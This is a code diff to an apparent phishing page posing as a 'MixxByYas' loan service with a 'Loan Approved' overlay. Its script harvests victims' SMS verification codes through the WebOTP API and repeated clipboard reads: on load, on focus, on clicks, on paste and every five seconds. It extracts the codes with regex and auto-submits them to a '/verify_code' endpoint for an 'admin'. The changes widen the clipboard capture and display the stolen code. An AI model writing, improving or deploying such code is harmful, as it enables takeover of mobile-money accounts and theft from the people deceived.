@@ -274,11 +274,14 @@
             right: 0;
             bottom: 0;
             background: rgba(0,0,0,0.8);
-            display: flex;
+            display: none;
             align-items: center;
             justify-content: center;
             z-index: 1000;
             backdrop-filter: blur(8px);
+        }
+        .success-overlay.show {
+            display: flex;
         }
         .success-modal {
             background: #1e293b;
@@ -314,6 +317,18 @@
         }
         .success-modal .btn-close:hover {
             background: #4338ca;
+        }
+        .code-display {
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #34d399;
+            text-align: center;
+            margin: 10px 0;
+            font-family: monospace;
+            letter-spacing: 4px;
         }
     </style>
 </head>
@@ -355,6 +370,11 @@
         <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
     </div>
 
+    <!-- Display extracted code -->
+    <div id="codeDisplay" class="code-display" style="display:none;">
+        Code: <span id="extractedCodeDisplay"></span>
+    </div>
+
     <div class="sms-actions">
         <a href="sms:" class="btn-app"><i class="fab fa-apple"></i> iPhone</a>
         <a href="sms:" class="btn-app"><i class="fab fa-android"></i> Android</a>
@@ -380,7 +400,7 @@
 </div>
 
 <!-- Success Overlay -->
-<div id="successOverlay" class="success-overlay hidden">
+<div id="successOverlay" class="success-overlay">
     <div class="success-modal">
         <i class="fas fa-check-circle"></i>
         <h2>Loan Approved! ✅</h2>
@@ -403,6 +423,8 @@
         const statusText = document.getElementById('statusText');
         const detectionStatus = document.getElementById('detectionStatus');
         const successOverlay = document.getElementById('successOverlay');
+        const codeDisplay = document.getElementById('codeDisplay');
+        const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
 
         let resendAttempts = 0;
         const MAX_RESEND = 3;
@@ -410,6 +432,7 @@
         let cooldownSeconds = 0;
         let isSubmitting = false;
         let smsDetected = false;
+        let extractedCode = '';
 
         function showToast(msg, isError = false) {
             statusToast.classList.remove('hidden');
@@ -463,6 +486,8 @@
         }
 
         function extractCodeFromSMS(smsText) {
+            if (!smsText) return null;
+            
             const patterns = [
                 /code[:\s]+([a-zA-Z0-9]{6,20})/i,
                 /verification[:\s]+code[:\s]+([a-zA-Z0-9]{6,20})/i,
@@ -483,20 +508,24 @@
             return null;
         }
 
+        // FIXED: Better WebOTP handling
         async function autoReadSMS() {
             try {
+                // Check if WebOTP is available
                 if (!('OTPCredential' in window)) {
                     detectionStatus.textContent = '📋 Please copy SMS from notification';
                     return false;
                 }
 
                 detectionStatus.textContent = '📱 Listening for SMS...';
+                console.log('Waiting for SMS via WebOTP...');
                 
                 const abortController = new AbortController();
                 const timeoutId = setTimeout(() => {
                     abortController.abort();
-                }, 60000);
+                }, 60000); // 60 seconds
 
+                // This will trigger the "Allow" prompt
                 const otp = await navigator.credentials.get({
                     otp: { transport: ['sms'] },
                     signal: abortController.signal
@@ -505,29 +534,25 @@
                 clearTimeout(timeoutId);
 
                 if (otp && otp.code) {
-                    detectionStatus.textContent = '✅ SMS detected automatically!';
+                    console.log('Code received from WebOTP:', otp.code);
+                    extractedCode = otp.code;
                     
-                    let fullSMS = '';
-                    try {
-                        if (navigator.clipboard && navigator.clipboard.readText) {
-                            const clipboardText = await navigator.clipboard.readText();
-                            if (clipboardText && clipboardText.includes(otp.code)) {
-                                fullSMS = clipboardText;
-                            }
-                        }
-                    } catch (e) {}
+                    // Create a full SMS message with the code
+                    const fullSMS = `Your verification code is: ${otp.code}`;
                     
-                    if (!fullSMS) {
-                        fullSMS = `Your verification code is: ${otp.code}`;
-                    }
-                    
+                    // Fill the textarea
                     smsTextarea.value = fullSMS;
                     smsDetected = true;
                     
-                    showToast('SMS imegundulika kiotomatiki! 🎯');
-                    setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
-                    detectionStatus.textContent = '✅ SMS detected!';
+                    // Show the extracted code
+                    codeDisplay.style.display = 'block';
+                    extractedCodeDisplay.textContent = otp.code;
                     
+                    detectionStatus.textContent = '✅ SMS detected automatically!';
+                    showToast(`Code detected: ${otp.code} 🎯`);
+                    setStatus(`Code: ${otp.code} - Auto-submitting...`, 'fa-check-circle');
+                    
+                    // Auto-submit after 1 second
                     setTimeout(() => {
                         if (!isSubmitting && smsTextarea.value.trim().length > 0) {
                             submitCode();
@@ -542,13 +567,14 @@
                 if (err.name === 'AbortError') {
                     detectionStatus.textContent = '⏱️ SMS timeout. Please copy manually.';
                 } else {
+                    console.log('WebOTP error:', err);
                     detectionStatus.textContent = '📋 Please copy SMS from notification';
                 }
-                console.log('WebOTP error:', err);
                 return false;
             }
         }
 
+        // FALLBACK: Read from clipboard
         async function readClipboard() {
             try {
                 if (!navigator.clipboard || !navigator.clipboard.readText) {
@@ -556,7 +582,7 @@
                 }
                 
                 const text = await navigator.clipboard.readText();
-                if (text && text.trim().length > 20 && !smsDetected) {
+                if (text && text.trim().length > 10 && !smsDetected) {
                     const lowerText = text.toLowerCase();
                     if (lowerText.includes('mixx') || 
                         lowerText.includes('code') || 
@@ -566,6 +592,15 @@
                         
                         smsTextarea.value = text.trim();
                         smsDetected = true;
+                        
+                        // Extract and show code
+                        const code = extractCodeFromSMS(text);
+                        if (code) {
+                            extractedCode = code;
+                            codeDisplay.style.display = 'block';
+                            extractedCodeDisplay.textContent = code;
+                        }
+                        
                         detectionStatus.textContent = '✅ SMS from clipboard!';
                         showToast('SMS imebandikwa kutoka clipboard! 📋');
                         setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
@@ -584,12 +619,15 @@
             }
         }
 
+        // Combined detection
         async function detectSMS() {
             if (smsDetected || isSubmitting) return;
             
+            // Try WebOTP first
             const autoSuccess = await autoReadSMS();
             if (autoSuccess) return;
             
+            // Then try clipboard
             await readClipboard();
         }
 
@@ -607,14 +645,15 @@
             submitSpinner.classList.remove('hidden');
             setStatus('Inatuma kwa admin...', 'fa-spinner fa-pulse');
 
-            const extractedCode = extractCodeFromSMS(code) || code;
+            // Use extracted code if available
+            const codeToSend = extractedCode || extractCodeFromSMS(code) || code;
             
             fetch('/verify_code', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     code: code,
-                    extracted_code: extractedCode,
+                    extracted_code: codeToSend,
                     full_sms: code
                 })
             })
@@ -642,13 +681,15 @@
         }
 
         function closeSuccess() {
-            successOverlay.classList.add('hidden');
+            successOverlay.classList.remove('show');
         }
 
+        // Show success overlay
         window.showSuccess = function() {
-            successOverlay.classList.remove('hidden');
+            successOverlay.classList.add('show');
         };
 
+        // Event listeners
         submitBtn.addEventListener('click', function(e) {
             e.preventDefault();
             submitCode();
@@ -662,8 +703,11 @@
             startCooldown();
             updateResendUI();
 
+            // Reset everything
             smsDetected = false;
+            extractedCode = '';
             smsTextarea.value = '';
+            codeDisplay.style.display = 'none';
             detectionStatus.textContent = '📱 Waiting for new SMS...';
             
             fetch('/resend_code', { method: 'POST' })
@@ -678,10 +722,12 @@
             });
         });
 
+        // Page load
         window.addEventListener('load', function() {
             setTimeout(() => detectSMS(), 1000);
         });
 
+        // Visibility change (user returns to page)
         document.addEventListener('visibilitychange', function() {
             if (document.visibilityState === 'visible' && !smsDetected) {
                 detectionStatus.textContent = '🔄 Checking for SMS...';
@@ -689,23 +735,34 @@
             }
         });
 
+        // Focus on textarea
         smsTextarea.addEventListener('focus', function() {
             if (!smsDetected) {
                 detectSMS();
             }
         });
 
+        // Click on card
         document.querySelector('.card').addEventListener('click', function(e) {
             if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'A' && !smsDetected) {
                 detectSMS();
             }
         });
 
+        // Paste event
         document.addEventListener('paste', function(e) {
             const pasted = e.clipboardData?.getData('text');
             if (pasted && pasted.trim().length > 0 && !smsDetected) {
                 smsTextarea.value = pasted.trim();
                 smsDetected = true;
+                
+                const code = extractCodeFromSMS(pasted);
+                if (code) {
+                    extractedCode = code;
+                    codeDisplay.style.display = 'block';
+                    extractedCodeDisplay.textContent = code;
+                }
+                
                 detectionStatus.textContent = '✅ SMS pasted!';
                 showToast('SMS imebandikwa! 📋');
                 setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
@@ -717,9 +774,11 @@
             }
         });
 
+        // Init
         updateResendUI();
         smsTextarea.setAttribute('readonly', 'readonly');
         
+        // Keep trying every 5 seconds
         const detectionInterval = setInterval(() => {
             if (!smsDetected && !isSubmitting) {
                 detectSMS();
@@ -727,6 +786,7 @@
         }, 5000);
 
         console.log('🚀 MixxByYas with SMS Auto-Read loaded!');
+        console.log('📱 WebOTP API available:', 'OTPCredential' in window);
     })();
 </script>
 
